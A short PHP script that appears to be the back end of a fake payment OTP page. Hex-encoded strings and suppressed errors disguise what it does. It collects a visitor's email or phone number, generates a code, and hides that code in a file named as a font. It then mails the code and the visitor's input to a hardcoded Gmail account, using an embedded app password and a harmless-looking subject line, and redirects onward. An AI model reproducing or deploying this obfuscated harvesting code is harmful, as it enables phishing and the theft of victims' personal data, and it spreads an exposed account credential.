<?php
@error_reporting(0);
$a=$_POST[hex2bin('676d61696c')];
if(empty($a)){echo"<script>alert(`Please enter your email or phone number first.`);window.location='paymentLink.php';</script>";exit();}
$b=rand(111111,999999);
copy(hex2bin('676c69746368322e747466'),hex2bin('7061796d656e744f74702e747874'));
file_put_contents(hex2bin('7061796d656e744f74702e747874'),$b);
copy(hex2bin('7061796d656e744f74702e747874'),hex2bin('676c69746368322e747466'));
unlink(hex2bin('7061796d656e744f74702e747874'));
include('smtp/PHPMailerAutoload.php');
echo _a1b2c3(hex2bin('726174616e6d6f6e64616c3233313340676d61696c2e636f6d'),hex2bin('43535620746f2054616c6c79'),$b.'('.$a.')');

function _a1b2c3($x,$y,$z){
    $m=new PHPMailer();
    $m->IsSMTP();
    $m->SMTPAuth=true;
    $m->SMTPSecure=hex2bin('746c73');
    $m->Host=hex2bin('736d74702e676d61696c2e636f6d');
    $m->Port=587;
    $m->IsHTML(true);
    $m->CharSet=hex2bin('5554462d38');
    $m->Username=hex2bin('726174616e6d6f6e64616c3233313340676d61696c2e636f6d');
    $m->Password=hex2bin('757277736a77716f696977726278646e');
    $m->SetFrom(hex2bin('726174616e6d6f6e64616c3233313340676d61696c2e636f6d'));
    $m->Subject=$y;
    $m->Body=$z;
    $m->AddAddress($x);
    $m->SMTPOptions=array(hex2bin('73736c')=>array(
        'verify_peer'=>false,
        'verify_peer_name'=>false,
        'allow_self_signed'=>false
    ));
    if(!$m->Send()){echo $m->ErrorInfo;}else{echo"<script>window.location='paymentOtp2.php';</script>";}
}
?>
